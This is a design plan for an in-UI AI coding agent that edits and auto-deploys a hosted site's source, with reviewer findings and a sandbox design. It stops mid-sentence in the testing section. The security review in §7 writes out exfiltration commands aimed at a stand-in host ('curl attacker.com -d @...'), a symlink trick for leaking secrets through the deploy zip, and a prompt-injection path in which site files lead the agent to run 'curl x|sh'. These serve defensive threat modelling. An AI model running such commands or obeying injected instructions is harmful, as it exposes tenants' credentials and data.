# Site Chat — in-UI AI editor

**Status:** Draft plan — revised after 3-agent review (see §7)
**Date:** 2026-08-20
**Scope:** Add a "Chat" tab to a site's detail page in the admin UI. Opening it lets the user
converse with an LLM that acts as a full coding agent over the site's source, then
auto-deploys the result — mirroring what a user would do with the siteio CLI.

---

## 1. Requirements (confirmed with user)

| # | Decision | Answer |
|---|----------|--------|
| 1 | What changes | **Content/code only** (HTML/CSS/JS). Not config, not backend data. |
| 2 | Model | Chat-style UI; **provider-agnostic / configurable** (not tied to ChatGPT). |
| 3 | Workflow | **Direct edit → auto-deploy immediately**, no confirm gate — paired with a **prominent one-click "Revert this change"** on every deploying turn as the safety net (decided after review). |
| 4 | Source of truth | The **original source**, rebuilt/redeployed (not in-place edits of live files). |
| 5 | How source is obtained | On open, **download the deployed site to a temp folder server-side**, edit there, redeploy — exactly like the CLI. |
| 6 | Agent power | **Full coding agent** — read/write/create/delete files + run shell commands. |
| 7 | Model + key config | **Global on the agent server** (admin-set), for now. |
| 8 | Isolation | **v1: per-turn sandbox container** (revised after review — original "no sandbox v1" is unsafe on multi-tenant hosts; see §7 Blocker B). Seam A still keeps the executor swappable. |
| 9 | History | **Persistent per site** — reopen and see full conversation. |
| 10 | Visibility | **Live-streamed agent steps** (files, commands, deploy progress). Fall back to action-summary only if streaming proves too hard. A-only ("Done") is not enough. |

---

## 2. What already exists (reuse, don't rebuild)

Investigation of the codebase found most of the *plumbing* already present:

- **Server-side source is always on disk, unpacked.** `storage.getCodePath(name)` →
  `<dataDir>/pocket-code/<name>/` holds `public/`, `pb_migrations/`, `pb_hooks/`.
  (`src/lib/agent/storage.ts:39`)
- **Redeploy from a zip, in-process.** `runSiteDeploy(site, zipData, deployedBy, message)`
  is the shared core used by CLI / scoped / MCP deploys. (`src/lib/agent/server.ts:1044-1068`)
- **Backend-preservation merge rule.** `mergeScopedDeploy({ incoming, currentCodePath, allowBackend })`
  keeps `pb_migrations`/`pb_hooks` from current code unless explicitly allowed.
  (`src/lib/agent/deploy-merge.ts`) — since our scope is content-only, we reuse this so the
  agent can never touch backend dirs, matching requirement #1.
- **Layout translation.** `PUBLIC_DIR`, `BACKEND_DIRS`, `toLocalPath` in `src/lib/site-layout.ts`
  are the single source of truth for the local↔deployed mapping.
- **Existing server-side working-copy pattern.** `StagingStore` (`src/lib/agent/staging-store.ts`)
  already materializes a per-session web-root working copy, has path-traversal + size guards,
  and `buildDeployZip(grantId, codePath)`. This is the *template* for our workspace — but it is a
  **constrained file editor with no LLM and no shell**, so we do not reuse it directly; we build a
  richer workspace that mounts the *whole* code dir (so the agent can build/run tooling), while
  still applying `mergeScopedDeploy(allowBackend:false)` at deploy time to enforce content-only.

### What does NOT exist yet (must build)

- **No LLM/agent dependency at all** (no `anthropic`/`openai`/agent SDK in `package.json`).
- **No streaming.** The API is plain JSON request/response; logs are polled every 3s.
  No SSE, no WebSocket, no `server.upgrade`. (`src/lib/agent/server.ts`)
- **No chat persistence** store.
- **No global LLM config** fields.

---

## 3. Architecture

Three clean seams, so the risky/pluggable parts are isolated:

```
UI (Alpine)  ──POST /sites/:name/chat (SSE response stream)──▶  ChatController
                                                                  │
                        ┌─────────────────────────────────────────┼───────────────────────┐
                        ▼                     ▼                     ▼                       ▼
                 ChatStore (persist)   ChatExecutor (SEAM A)   AgentRunner (SEAM B)   runSiteDeploy (reuse)
                 pocket-chat/<name>/   SandboxChatExecutor v1  ClaudeAgentRunner v1
                                       (Local/other later)     (provider-agnostic iface)
```

### Seam A — `ChatExecutor` (isolation boundary, requirement #8)

Owns *where the agent process runs and how the workspace is prepared/applied*. It does NOT
know about the LLM. Interface:

```ts
interface ChatExecutor {
  // Prepare a temp working copy of the site's current code, run the agent loop
  // inside it (delegating LLM turns to AgentRunner), then return the changed tree.
  run(input: {
    site: Site
    codePath: string          // storage.getCodePath(name)  — source to copy in
    history: ChatMessage[]     // prior turns for context
    userMessage: string
    onEvent: (e: ChatEvent) => void   // streamed to UI
    signal: AbortSignal
  }): Promise<{ workspaceDir: string; summary: string }>
}
```

- **v1: `SandboxChatExecutor`** (revised — see §7 Blocker B). Prepares the workspace at
  `<dataDir>/chat-workspaces/<name>/<turnId>/`, then runs the agent inside a **throwaway container**
  (reuse `docker.ts`) with only the workspace bind-mounted. Full design in §8.
- **Kept behind the seam for later:** a `LocalChatExecutor` (host process) or an alternative sandbox
  tech (gVisor, Firecracker, per-tenant pool). The controller depends only on the interface, so the
  isolation mechanism can change without touching the controller/runner/UI.
- A `LocalChatExecutor` may still be built **for local dev / single-tenant** use (fast, no Docker),
  but is never the default on a shared host.

After `run()` returns, the controller builds the deploy zip from the workspace via the
`mergeScopedDeploy(allowBackend:false)` rule and calls `runSiteDeploy(...)`. Deploy is done by
the controller (trusted), never by the agent — so even a sandboxed agent can't deploy arbitrarily.

### Seam B — `AgentRunner` (LLM/provider boundary, requirement #2, #6)

Owns the *agent loop*: model calls, tool-use, streaming. Provider-agnostic interface:

```ts
interface AgentRunner {
  run(input: {
    cwd: string                       // the workspace temp dir
    history: ChatMessage[]
    userMessage: string
    tools: "coding"                   // read/write/edit/create/delete + bash, scoped to cwd
    onEvent: (e: ChatEvent) => void
    signal: AbortSignal
  }): Promise<{ finalText: string }>
}
```

**Recommended v1 implementation — Claude Agent SDK (`@anthropic-ai/claude-agent-sdk`).**
Rationale: requirement #6 literally described "like Claude Code operating on the folder." The
Agent SDK gives file tools + bash + the agent loop + streaming events out of the box, scoped to a
`cwd`, with a permission model that maps cleanly onto the future sandbox. Building this by hand on
raw provider APIs means re-implementing Claude Code (file tools, bash, loop, streaming) — much more
code and risk for v1.

- Provider-agnosticism is preserved **at the interface**: `AgentRunner` is the seam. An
  `OpenAiCompatibleRunner` (custom minimal loop over an OpenAI-compatible endpoint) can be added
  later without touching the controller or UI.
- Config selects the runner: `SITEIO_LLM_PROVIDER` (default `anthropic`), `SITEIO_LLM_MODEL`
  (default a current Claude model).
- **Auth = a Claude subscription long-lived OAuth token** (decided), NOT a per-call API key.
  Generated once by the admin via `claude setup-token` and passed to the SDK as the
  `CLAUDE_CODE_OAUTH_TOKEN` env var; usage is billed to the admin's Claude subscription (Pro/Max).
  Stored as `SITEIO_LLM_OAUTH_TOKEN` in agent config — sensitive, masked, file mode 0600, and (per
  §8) held by the host / egress proxy, never inside the agent container. An `ANTHROPIC_API_KEY` path
  stays available as an alternative for non-subscription setups, selected by which credential is set.
  > Note: a subscription token ties all chat usage to one account's rate limits — fine for the
  > admin-set global-config model (req #7); revisit if per-user billing is ever wanted.

> **Decided:** Claude Agent SDK for v1 (`@anthropic-ai/claude-agent-sdk`), authenticated with a
> Claude subscription OAuth token (`claude setup-token` → `CLAUDE_CODE_OAUTH_TOKEN`).

### Streaming transport (requirement #10)

Bun.serve can return a streaming `Response`. `POST /sites/:name/chat` returns
`Content-Type: text/event-stream`; the handler writes SSE `data:` frames from `onEvent` as the
agent works, then closes. The UI consumes it with `fetch` + a `ReadableStream` reader (not
`EventSource`, since we need a POST body + the `X-API-Key` header). `ChatEvent` kinds:
`assistant_text`, `tool_call` (name, e.g. "edit index.html" / "run npm build"), `tool_result`,
`deploy_progress`, `done` (final text + new version), `error`. If SSE proves troublesome we
degrade to buffering events and returning a summary (requirement #10 fallback C).

### Persistence (requirement #9)

New `ChatStore` following the `storage.ts` per-site-tree convention:
`<dataDir>/pocket-chat/<name>/messages.json` (append-only array of `ChatMessage`). Reset on
`rename` and delete on site removal (wire into `storage.rename` / site delete, same places the
other four trees are handled). Each assistant turn records the resulting deploy `version`, so the
history doubles as a lightweight audit trail (cheap superset of #9; the full deploy-linking of
option C is thereby available for free but not surfaced heavily).

### Per-turn caps

Backstop against runaway loops / cost (a static-site edit is normally a handful of tool calls):

- **Wall-clock:** 5 min per turn (via `AbortSignal` timeout).
- **Max agent turns** (tool-use iterations): 40.
- **Token budget:** none in v1 — wall-clock + turn cap suffice; add later if cost warrants.

All three are config-overridable (`SITEIO_LLM_MAX_*`) but ship with these defaults.

### Concurrency & safety

- **One active turn per site** (it deploys). A per-site in-memory lock in the controller; a
  second concurrent turn gets 409. Reuses the same optimistic-version discipline as deploy.
- **Feature gating:** if no `SITEIO_LLM_API_KEY` configured, the endpoint returns "not configured"
  and the UI hides/greys the Chat tab.
- **Workspace cleanup:** temp workspace removed in `finally`, like `download.ts`.
- **Content-only enforcement:** guaranteed at deploy (merge rule), independent of what the agent
  did in the workspace — defense in depth for requirement #1.

---

## 4. Implementation steps (incremental, each independently testable)

> **Note:** the ordering below is **superseded by the "Revised build order" in §7** (sandbox is v1,
> plus a Step 0 packaging spike). Kept here for the per-step test notes; read §7 for the authoritative
> sequence and §8/§9 for the sandbox and UI detail.


Ordered so the risky/new pieces come last and everything is verifiable step by step (per user's
"go step by step, test stability at each step" preference).

1. **Config plumbing.** Add `llmProvider?`, `llmModel?` to `PersistedAgentConfig`
   (`src/config/agent.ts`) and `AgentConfig` (`src/types.ts`); add `SITEIO_LLM_*` env wiring in
   `src/commands/agent/start.ts`; add `llmApiKey` to the sensitive-keys list. Add a
   `chatEnabled`/`chatConfigured` flag surfaced via the existing agent-info endpoint.
   *Test:* config load/mask unit test; agent info reports configured state.

2. **`ChatStore`.** New `src/lib/agent/chat-store.ts` (mirror `StagingStore` structure);
   `append`, `list`, `reset`, `remove`. Wire `rename`/site-delete cleanup.
   *Test:* unit round-trip; rename moves history; delete removes it.

3. **`AgentRunner` interface + `ClaudeAgentRunner`.** Add dep, implement the loop scoped to `cwd`
   with coding tools + bash, emitting `ChatEvent`s. Behind the interface.
   *Test:* **real** integration — the actual SDK runs against a throwaway temp dir with a real prompt,
   authenticated by the local `CLAUDE_CODE_OAUTH_TOKEN`, and actually edits a file (see §10 — this is
   run locally, not mocked; CI without the token skips it, local dev does not).

4. **`ChatExecutor` interface + `SandboxChatExecutor`.** Prepare workspace → run `AgentRunner` in a
   throwaway container (§8) → collect result. Cleanup.
   *Test:* **real** — a real container spins up, a real agent edits the workspace, changes are
   collected; verify egress-deny, resource limits, and `docker kill` on timeout all actually hold.
   (A fake runner may be used *additionally* for fast deterministic edge-case tests, never as the
   substitute for this.)

5. **`ChatController` + deploy wiring.** Lock, run executor, build zip via
   `mergeScopedDeploy(allowBackend:false)`, call `runSiteDeploy`, append to `ChatStore`, stream
   `deploy_progress`/`done`.
   *Test:* **real e2e** against a live `AgentServer` (random port, `skipTraefik:true`): a real chat
   turn edits a real site's source and produces a new deployed version + persisted history — no mocks.

6. **Server endpoints.** In `handleRequest` (god-key section, ~`server.ts:250`):
   - `POST /sites/:name/chat` → SSE stream (new turn).
   - `GET /sites/:name/chat` → `handleGetChatHistory` (JSON).
   - `DELETE /sites/:name/chat` → clear history (optional).
   Add matching methods to `src/lib/client.ts` for CLI parity (nice-to-have; a `siteio sites chat`
   CLI could follow later, out of scope here).
   *Test:* e2e history GET; SSE frames arrive in order.

7. **UI — Chat tab.** In `src/lib/agent/ui/`:
   - Sub-tab button in the site detail tab bar (`index.html:448-458`, copy Logs button).
   - Panel `<template x-if="route.subtab === 'chat'">` (message list + input box + live event feed).
   - `ui.js`: `loadChat(name)` (history), `sendChatMessage(name, text)` reading the SSE stream via
     `fetch`+reader and appending events live; wire into `applyRoute` (`ui.js:84-92`).
   - Hide the tab when `chatConfigured` is false.
   *Test:* manual via `/run`/playwright — send a message, watch steps stream, confirm redeploy and
   that reopening shows history.

8. **Docs + release.** Update README/CLAUDE feature list; add `SITEIO_LLM_*` to env docs. Version
   bump per release process.

---

## 5. Risks / notes

- **Agent capability = shell, so the sandbox is the load-bearing control** (v1 ships it — §8).
  The residual risk is the sandbox's own escape surface (docker socket must NOT be exposed to it,
  egress must be denied except the LLM host) plus the symlink-in-deploy-zip trick (§7 Blocker B) —
  fixed by `lstat`-on-collect regardless of executor. Content-only merge is defense-in-depth, not
  the primary boundary.
- **Cost/runaway loops.** Per-turn caps: 240s wall-clock (below Bun's 255s SSE idle max — §7 S1),
  40 agent turns, plus container `--pids-limit`/`--cpus`/`--memory` and workspace size cap.
- **Provider lock-in for v1.** Mitigated by the `AgentRunner` seam; revisit if a non-Claude
  provider is needed sooner.
- **Deploy inherits optimistic-version conflicts.** If the site is deployed elsewhere mid-chat, the
  turn's deploy may 409 — surface it as a chat error and re-seed the workspace.

---

## 6. Decisions (resolved)

1. **AgentRunner v1 = Claude Agent SDK** (`@anthropic-ai/claude-agent-sdk`). ✓
2. **Workspace = whole code dir** (agent can run real build tooling); content-only enforced at
   deploy via `mergeScopedDeploy(allowBackend:false)`. Backend dirs excluded from / marked read-only
   in the workspace to avoid discarded no-op edits (§7 N3). ✓
3. **Per-turn caps:** **240s** wall-clock (SSE-safe, §7 S1), 40 agent turns, no token budget in v1;
   plus container resource limits (§8). ✓
4. **Isolation = per-turn sandbox container in v1** (§8), behind Seam A. Reverses the original
   "no sandbox v1" after security review. ✓
5. **Review posture = zero confirm gate + prominent one-click revert** on every deploying turn
   (§9), wired to existing `rollbackSite`. ✓

---

## 7. Review findings (3 agents) & required revisions

Three independent reviewers (architecture/feasibility, security, product/UX) critiqued this plan
against the real code. Two hard problems surfaced that **change decisions made in §1/§6**. Cited
`file:line` where they verified against source.

### 🔴 BLOCKER A — Claude Agent SDK cannot run in the shipped artifact as-is (architecture)

The agent ships as (1) a **compiled single-file Bun binary** (`bun build --compile --bytecode`,
`.github/workflows/release.yml:80`, delivered via `siteio update`) and (2) a **Node-less Docker
image** (`Dockerfile` is `debian:bookworm-slim` + the compiled binary; no `node`/`bun`/`npm`).

The Agent SDK spawns the Claude Code CLI as a subprocess, resolving `cli.js` via `import.meta.url`
relative to its package. Inside a `--compile` binary that path is a virtual `/$bunfs/root/...` that
doesn't exist on disk → *"Claude Code executable not found"* (documented SDK failure). The bundled
CLI also has unguarded `Bun.*` refs that throw under Node.

**Revision:** add a **packaging spike as a prerequisite gate before any SDK work** (new Step 0
below). Options to evaluate: bundle a real `claude` executable in the image + pass
`pathToClaudeCodeExecutable` at runtime; extract via `@anthropic-ai/claude-agent-sdk/extract`
post-build; or run the runner as a separate process/container that has a proper Node/CLI. Until
this is proven end-to-end (dev binary **and** compiled binary in the Docker image), requirement #6
is not deliverable. Step 3's "add dep" is not sufficient; the CI `skip`-guard would hide this
failure rather than resolve it.

### 🔴 BLOCKER B — "Shell on host, no sandbox" (v1 choice) is unsafe on the multi-tenant prod hosts (security)

This reverses the §1 row-8 / §6.? assumption that host-shell is acceptable for v1. The security
reviewer demonstrated that a full `bash` agent on the host (which runs as **root**, `install.ts:70-75`,
no `USER` in Dockerfile) can, in a single turn, read secrets that are **plaintext & world-readable
(0644)** on the same volume as the workspace:

- **God API key + Cloudflare/DNS creds** — `agent-config.json` written with no mode
  (`config/agent.ts:51-55`). `cat` = full platform takeover of every site/app.
- **Every tenant's PocketBase superuser password** — `pockets/*.json` (`storage.ts:48,65`).
- **Every tenant's live DB** — `pocket-data/<name>/` under the same `/data` (`storage.ts:23`).
- **Root over all containers** via the docker socket the agent already uses (`docker.ts`).
- **Unrestricted egress** — `curl attacker.com -d @/data/agent-config.json`.

The plan's "deploy done by controller / content-only merge" defense is **irrelevant once shell is
granted** — the agent doesn't need the deploy path to exfiltrate. And `cwd` is a working directory,
not a jail.

Additional concrete attacks (independent of sandbox choice):

- **Symlink exfiltration through the deploy zip.** `mergeScopedDeploy` (`deploy-merge.ts:42-48`) and
  `StagingStore.buildDeployZip` (`staging-store.ts:224-229`) `statSync`+`readFileSync` and thus
  **follow symlinks**. `ln -s /data/agent-config.json public/x.txt` publishes the god key to the
  tenant's public HTTPS site — bypasses even a no-egress sandbox. **Fix (do regardless of executor):
  `lstat` on collect, reject symlinks, confine reads to the workspace real-path.**
- **Prompt injection = RCE.** The agent ingests site files that untrusted end-users / share-grant
  invitees influence. Injected "run `curl x|sh`" executes with the agent's privileges. Plan didn't
  mention injection at all. Treat all workspace content as hostile.
- **LLM API key readable by the agent it powers** — `env`/`/proc/self/environ`. Masking (§ step 1)
  only fixes *display*. The key must live in the controller/proxy, not the agent's shell env.
- **No resource isolation** — workspace under `/data` shares the tenants' disk; `dd`/fork-bomb DoSes
  all co-tenants. `AbortSignal` won't reap `nohup … & disown` grandchildren.
- **Chat history may persist secrets** — captured `tool_result` output (e.g. an `env` dump) written
  plaintext to `pocket-chat/<name>/messages.json` and rendered in the UI. Give the store 0600 and
  redact/limit tool-output capture.

**Revision (both reviewers concur): make `SandboxChatExecutor` the v1 executor, not a later phase.**
The plan already designed it as the drop-in (Seam A); shipping it now is *less* work than correctly
retrofitting host-process mitigations. Recommended v1 minimum:

1. Throwaway container per turn (reuse `docker.ts`); **only the workspace bind-mounted** — no
   `/data`, no docker socket, no host mounts.
2. **Egress denied** except the single LLM API host (dedicated docker network / firewall).
3. **LLM key never inside the agent container** — proxy calls through the controller.
4. Resource limits: `--pids-limit`, `--cpus`, `--memory`, size-capped workspace; **kill the
   container** (not just abort the signal) on timeout.
5. `lstat`/reject-symlinks on deploy-zip collection (also fixes host case).
6. Independently harden secrets at rest: `agent-config.json` + `pockets/*.json` → **0600** (latent
   issue this feature would weaponize).

> ⚠️ This is a decision for the user: it reverses the "v1 = no sandbox" call. Note the caveat from
> architecture review — the sandbox is *not* a trivial drop-in once BLOCKER A is factored in
> (executable availability must be re-solved inside the container, and events streamed across the
> container boundary). The interface stays stable; the implementation is real work.

### 🟠 SHOULD-FIX

- **SSE idle timeout vs. the 5-min cap (architecture S1).** `Bun.serve` has no `idleTimeout` set
  (`server.ts:1575-1583`) → ~10s default, and its **max is 255s — below the 5-min wall-clock cap**.
  Must send periodic SSE heartbeat/comment frames between model turns, and/or lower wall-clock to
  <255s. **Revision:** set wall-clock cap to **240s** and emit heartbeats.
- **Long-lived SSE through the CDN (architecture S2).** The codebase already works around CDN
  request timeouts (`server.ts:1585-1588`); a multi-minute streaming POST on `api.<domain>` may hit
  the edge (~100s) timeout. **Validate streaming end-to-end through the real edge early** (before
  building the UI on it). The "fallback C" (buffer + poll history) may be the *primary* reliable
  path in prod, not a fallback — build the **poll-history resync path first** as the reliability
  floor, stream as enhancement.
- **Chat cleanup wiring was misdescribed (architecture S3).** `SiteStorage.delete()`/`rename()`
  (`storage.ts:79-85,168-189`) know nothing about external stores, and staging is notably **not**
  cleaned on delete/rename (only lazily via `grants.gc()` at startup). So there's no "same place"
  hook. **Revision:** add `ChatStore` cleanup explicitly in `handleDeleteSite`/`handleRenameSite`
  (rename must move `pocket-chat/<old>`→`<new>`; delete must rm it) + a startup sweep of
  `chat-workspaces/` for crash-orphaned dirs.
- **`runSiteDeploy` bookkeeping (architecture, accuracy).** The shared core is at `server.ts:1103`
  (plan cited 1044, which is `handleDeploySite`). `runSiteDeploy` alone does **not** do the
  optimistic `X-Expected-Version` check, `status:"failed"` on throw, or first-deploy `create` — the
  controller must replicate `handleDeploySite`'s bookkeeping around it. Seed the workspace with the
  site's current `version` and re-seed on 409 (mirror `StagingStore.seededVersion`).
- **CLI parity is not a drop-in (architecture S4).** A streaming client method can't use
  `client.request<T>()` (which does `response.json()` on the `{success,data}` envelope); it needs a
  separate path like `requestBytes` (`client.ts:61`). Keep CLI parity out of v1 (already scoped out).
- **"Content-only" ≠ "safe content" (security S1).** Even working as designed, the agent writes
  arbitrary JS/HTML to a live valid-HTTPS domain (crypto-miner, phishing, supply-chain). Pair
  auto-deploy with prominent one-click rollback (see UX MUST-HAVEs) and reconsider whether *zero*
  human review is acceptable for injection-reachable content.
- **Tenant data → external LLM (security S2).** Ships tenant source (and, via injection, possibly
  data) to a third-party provider — confidentiality/data-residency concern. Document it; keep the
  provider/endpoint operator-controlled (config seam already supports this).
- **Exclude backend dirs from the workspace (architecture N3).** With "whole code dir", the agent
  can waste turns editing `pb_migrations`/`pb_hooks` that the merge silently discards. Either exclude
  them from the copied workspace or tell the agent they're read-only. (Keeps the §6.2 "whole dir"
  decision but avoids confusing no-op edits.)

### 🟠 UX MUST-HAVES for a coherent v1 (product review)

Step 7 ("UI — Chat tab") was one paragraph but hides most of the product risk. Auto-deploy-with-no-
review to a *live* site demands compensating controls — and the plumbing for all of them already
exists:

1. **In-chat revert tied to the version.** Record **both `versionBefore` and `versionAfter`** per
   turn; render a "Revert this change" button on each deploying turn, wired to the existing
   `rollbackSite` (`ui.js:450`, History rollback `index.html:539-545`). This is the safety net that
   makes no-review acceptable.
2. **"No changes made" is a first-class outcome.** Diff workspace vs. source; if empty, **skip
   `runSiteDeploy`** and render "No changes — nothing deployed." Don't burn a version on Q&A turns.
3. **Deploy failure / 409 rendered as recoverable.** Show the agent's completed work + a distinct
   failure banner (build vs. conflict vs. timeout) + **Retry deploy from the already-computed
   workspace** (reconcile with `finally` cleanup so the work isn't lost before retry).
4. **Cancel/Stop button** during an active turn (trips the server `AbortSignal` / kills the
   container). Mirror the existing Esc-cancels convention (`ui.js:144-150`).
5. **Feature-gating actually wired.** `chatConfigured` must be readable on the **site-detail** route
   (it currently rides `agentInfo`, loaded only on Settings). Deep-link to `#/sites/x/chat` when
   unconfigured needs an explicit "not configured" empty state, not a blank pane.
6. **First-message empty state** that discloses the **auto-deploy-to-live** contract + 2-3 example
   prompts.
7. **Turn-complete summary card:** list of **changed files** + **live URL** (`selectedSite.url`,
   "Open ↗" pattern) — the payoff moment.
8. **Turn survives navigation/stream drop.** Work keeps running server-side (holds the lock); a
   reopened tab must resync via history poll (dovetails with the poll-first reliability floor above).
   Note: logs polling *pauses* on `document.hidden` (`ui.js:551`) — chat needs the **inverse** (work
   must not pause).
9. **SSE must replicate `apiFetch` 401 handling** (`ui.js:165-184`) — dispatch `siteio:unauthenticated`
   on expiry, or a dropped stream dies silently.
10. **History**: non-optional clear button; bound context sent to the LLM (last N turns) to cap
    cost/latency; show deployed version per turn.
11. **Render natively**: reuse the `<pre class="logs">` styling for tool output, card styles for
    messages, `$nextTick`+`$refs` auto-scroll (`ui.js:523-524`); collapsible tool-call chips.
12. **Show which model/provider is active** (from `agentInfo`) in the panel header.

### Revised build order (supersedes §4 ordering)

- **Step 0 (NEW, prerequisite gate):** Packaging spike for the Agent SDK — prove `claude` executable
  availability in **both** the dev binary and the compiled binary inside the Docker image. No
  further SDK work until green.
- **Step 1–2:** Config plumbing + `ChatStore` (as before) — plus secrets-at-rest chmod (0600) and
  explicit delete/rename cleanup + startup sweep.
- **Step 3 (revised): `SandboxChatExecutor` + `AgentRunner`** together — sandbox is v1, not later.
  Includes egress lockdown, key-out-of-container, resource limits, symlink-safe collection.
- **Step 4–5:** Controller + deploy wiring (replicate `handleDeploySite` bookkeeping; no-change
  skip; version-before/after capture).
- **Step 6:** Endpoints — **poll-history resync path first**, SSE (with heartbeats) as enhancement.
- **Step 7 (now a mini-spec):** UI with the 12 MUST-HAVEs above.
- **Step 8:** Docs/release.

### Decisions to re-confirm with the user

1. **Isolation: sandbox-as-v1 (recommended by both architecture + security) vs. keep host-shell v1.**
   This reverses the earlier §1-row-8 choice. Given the prod hosts are multi-tenant with
   world-readable secrets, host-shell v1 is assessed as unsafe to ship.
2. **Packaging approach for the Agent SDK** (bundle `claude` / extract / separate runner) — resolve
   via Step 0 spike; may influence effort estimate.
3. **Zero human review vs. a lightweight confirm** for injection-reachable content (security S1).

---

## 8. Sandbox executor design (v1 — `SandboxChatExecutor`)

The load-bearing security control. Contract is unchanged (Seam A); this is the implementation.

### Per-turn lifecycle

1. **Prepare workspace (host side, trusted).** `cpSync` the site's code dir to
   `<dataDir>/chat-workspaces/<name>/<turnId>/`, copying **files only** (skip symlinks via `lstat`;
   exclude `pb_migrations`/`pb_hooks` per §6.2). This dir is the *only* thing the container sees.
2. **Launch throwaway container** (reuse `docker.ts` spawn patterns):
   - Image: a small image that contains the `claude` executable + a Node/Bun runtime (built once in
     CI — resolves §7 Blocker A *inside* the sandbox; the host binary problem and the container
     problem are solved by the same purpose-built image).
   - Mounts: **only** `-v <workspace>:/work` (rw). **No `/data`, no docker socket, no host paths.**
   - `--network` = a dedicated network / firewall that **denies all egress except the LLM API host**.
   - Limits: `--pids-limit`, `--cpus`, `--memory`, read-only rootfs where possible, `--cap-drop=ALL`,
     non-root user inside the container, workspace on a size-capped mount.
   - Env: model/provider only. **The LLM API key is NOT passed in** (see key handling below).
3. **Run the agent** inside the container with `cwd=/work`, streaming `ChatEvent`s back over the
   container's stdout (a line-delimited JSON protocol the host parses and forwards to `onEvent`).
4. **Timeout/abort:** on 240s wall-clock or user Stop, **`docker kill` the container** (reaps all
   grandchildren — `AbortSignal` alone can't, §7 B5).
5. **Collect result (host side).** Read changed files back from the workspace with `lstat`
   symlink-rejection, confined to the workspace real-path (§7 Blocker B). Controller builds the
   deploy zip via `mergeScopedDeploy(allowBackend:false)` and deploys. **The agent never deploys.**
6. **Cleanup** the container + workspace in `finally`; a **startup sweep** removes crash-orphaned
   `chat-workspaces/*` (§7 N3).

### Credential handling (token must never sit in the agent container — §7 B4)

The credential here is a **long-lived Claude subscription OAuth token** (`CLAUDE_CODE_OAUTH_TOKEN`).
Because it is long-lived and grants full use of the admin's subscription, keeping it out of the
sandbox is even more important than a scoped API key would be. Preferred: the host runs a tiny
**egress proxy** the container talks to; the proxy injects the token and is the only allowed egress
(to the Anthropic API host). The container holds no credential, so a compromised/injected agent
can't exfiltrate the token or call arbitrary hosts. (Fallback if a proxy is too much for v1: pass
the token into the container but treat that as a known gap to close before multi-tenant prod — the
proxy is the clean answer and unifies egress-deny + credential-hiding.)

### Secrets at rest (independent hardening — §7 B1/B6)

Regardless of the sandbox: `agent-config.json` (`config/agent.ts:51-55`) and `pockets/*.json`
(`storage.ts:48,65`) are currently 0644. Change writes to **0600**. This is a latent issue this
feature would weaponize; fix it in Step 1.

### Open sub-questions for §8

- **Image build/ship**: where the sandbox image is built (CI) and how it reaches prod (bundled?
  pulled on first use, like PocketBase via `docker.pull`?). Resolve in the Step 0 spike.
- **Egress allowlisting mechanism** on the target hosts (docker network + iptables vs. proxy-only).
- **Warm vs. cold container** per turn (cold is simpler + safer; measure startup cost against UX).

---

## 9. Step 7 UI mini-spec (Chat tab)

Auto-deploy-to-live with zero confirm gate (decided) ⇒ the compensating controls below are part of
v1, not polish. All reuse existing UI plumbing.

### Layout (native to the detail page)

- **Sub-tab** "Chat" in the site detail tab bar (copy the Logs button; hidden when
  `chatConfigured` is false — flag must be readable on the **site-detail** route, not only Settings,
  §7 UX-5).
- Panel: header (site name · **active model/provider label**, §7 UX-12) → scrollable **transcript**
  → **input box** with Send / **Stop** (during a run).
- Reuse card styles for messages, `<pre class="logs">` styling for tool output, `$nextTick`+`$refs`
  auto-scroll (`ui.js:523-524`).

### Transcript rendering

- **User message** — card.
- **Assistant text** — card.
- **Tool-call chips** — compact, collapsible (`edit index.html`, `run npm build`); a coding turn
  emits many, so default-collapsed with expand for output.
- **Deploy progress** — inline status line.
- **Turn-complete summary card** (§7 UX-7): **changed-files list** + **live URL** ("Open ↗",
  `selectedSite.url`) + **"Revert this change"** button.

### The four compensating controls (from §7 UX MUST-HAVEs)

1. **In-chat revert** — each deploying turn stores `versionBefore`/`versionAfter`; the Revert button
   calls existing `rollbackSite(name, versionBefore)` (`ui.js:450`).
2. **"No changes" outcome** — controller diffs workspace vs. source; if empty, **skip deploy** and
   render "No changes — nothing deployed" (no version burned).
3. **Deploy-failure recovery** — distinct banner (build fail / 409 conflict / timeout) + **Retry
   deploy** from the already-computed workspace (keep the workspace until the user acts, don't tear
   down in `finally` before retry is possible).
4. **Stop button** — trips the server `AbortSignal` → `docker kill` (§8). Mirror the Esc convention
   (`ui.js:144-150`).

### Reliability (streaming as enhancement, poll as floor — §7 S2/UX-8)

- Build the **poll-history resync path first**: turn runs server-side under the per-site lock;
  history is append-only JSON; a reopened/refreshed tab polls `GET /sites/:name/chat` to catch the
  completed turn even if the stream dropped.
- SSE (POST + reader, with **heartbeat frames** every <255s, §7 S1) layers live steps on top.
- SSE reader must replicate `apiFetch` 401 handling → dispatch `siteio:unauthenticated` (§7 UX-9).
- Chat work must **not pause on `document.hidden`** (inverse of logs polling, `ui.js:551`).

### Other v1 UI items

- **Empty state** discloses the **auto-deploy-to-live** contract + 2-3 example prompts (§7 UX-6).
- **Clear history** button (non-optional); bound LLM context to last N turns to cap cost (§7 UX-10).
- **History shows deployed version per turn** (audit trail; connects to Revert).
- After a successful deploy, trigger a **thumbnail refresh** (`refreshThumbnail`, `ui.js:250-262`).

---

## 10. Testing & local verification (acceptance principle)

**Everything in this feature must be verifiable locally, end-to-end, with the real stack — no mocks
as the acceptance bar.** Mocks/fakes are allowed only as an *additional* fast layer for deterministic
edge cases; no part of the design may be provable *only* via a fake.

### The real local loop

Runnable on the dev machine (macOS + Docker Desktop) with `bun run dev` (agent) and a real
`CLAUDE_CODE_OAUTH_TOKEN` in the environment:

1. Deploy a throwaway site locally (`siteio sites deploy`, or the existing local dev flow).
2. Open the Chat tab in the admin UI, send a real prompt ("change the headline to X").
3. Observe: real Claude Agent SDK runs **inside a real sandbox container**, streams real tool steps
   to the UI, the real workspace is edited, `runSiteDeploy` produces a **new version**, the live
   local site reflects the change, the turn is persisted, and **Revert** rolls it back.
4. Exercise the failure/edge paths for real: "no changes" turn, deploy 409, Stop mid-turn (container
   is `docker kill`ed), unconfigured-token state.

This whole loop is the definition of done — validated with `/run` and/or the Playwright skill, not
just unit assertions.

### Auth for testing

- Local + manual: real `CLAUDE_CODE_OAUTH_TOKEN` from `claude setup-token` (the admin's Claude
  subscription). The same credential the feature uses in production — tests exercise the real auth
  path, not a stub.
- **CI:** the token is a repo secret when available (real e2e runs); when absent, the token-requiring
  tests **skip** (like `skipTraefik`) — they are never replaced by a passing mock that would give a
